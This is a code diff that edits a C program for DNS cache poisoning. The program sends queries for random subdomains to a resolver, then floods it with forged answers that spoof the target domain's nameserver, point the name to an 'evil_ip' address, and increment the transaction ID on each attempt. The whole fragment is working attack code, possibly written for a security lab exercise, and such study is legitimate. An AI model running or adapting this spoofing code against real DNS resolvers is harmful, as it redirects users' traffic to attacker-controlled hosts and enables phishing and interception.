@@ -346,7 +346,7 @@ unsigned int generate_dns_answer (
 	dns->flags=htons(FLAG_R);
     //Random transaction ID
     dns->query_id=rand();
-    
+
     *txid_ptr = &(dns->query_id);
 
     //Points to the last byte written
@@ -443,8 +443,6 @@ int main(int argc, char *argv[])
 
     // buffer to hold the packet
     char buffer[PCKT_LEN];
-    // set the buffer to 0 for all bytes
-    memset(buffer, 0, PCKT_LEN);
 
     //Packet length in bytes
     unsigned int packet_len = 0;
@@ -457,34 +455,41 @@ int main(int argc, char *argv[])
 
     srand(time(0)); //use time as seed
 
-    //randomize query (first 4 chars of first label)
-    for(int i = 1; i < 5; i++) {
-        query[i] = '1' + rand() % ('9'-'1');
-    }
 
-    packet_len = generate_dns_question(src_ip, dst_ip, query, buffer);
 
-    printf("Sending query...\n");    
-    //Ask random query
-    if(sendto(sd, buffer, packet_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
-        printf("packet send error %d which means %s\n",errno,strerror(errno));
-    }
-    
-    //Flood with fake answers
-    
-    memset(buffer, 0, PCKT_LEN);
-
-    //We spoof src ip. 
-    packet_len = generate_dns_answer(target_domain_nameserver_ip, dst_ip, query, evil_ip, buffer, &txid_ptr);
-
-    printf("Sending flood answer packets...\n");
     for(int i = 0; i < 2; i++) {
+        memset(buffer, 0, PCKT_LEN);
+
+        //randomize query (first 4 chars of first label)
+        for(int i = 1; i < 5; i++) {
+            query[i] = '1' + rand() % ('9'-'1');
+        }
+
+        packet_len = generate_dns_question(src_ip, dst_ip, query, buffer);
+
+        printf("Sending query...\n");    
+        //Ask random query
         if(sendto(sd, buffer, packet_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
             printf("packet send error %d which means %s\n",errno,strerror(errno));
         }
-        printf("Sent!\n");
-        *txid_ptr = -1;
+        
+        //Flood with fake answers
+        
+        memset(buffer, 0, PCKT_LEN);
+
+        //We spoof src ip. 
+        packet_len = generate_dns_answer(target_domain_nameserver_ip, dst_ip, query, evil_ip, buffer, &txid_ptr);
+
+        printf("Sending flood answer packets...\n");
+        for(int j = 0; j < 3; j++) {
+            if(sendto(sd, buffer, packet_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
+                printf("packet send error %d which means %s\n",errno,strerror(errno));
+            }
+            printf("Sent!\n");
+            *txid_ptr = (*txid_ptr) + htons(1); //htons is very important! Big edian only!
+        }
     }
+
     
 
     close(sd);
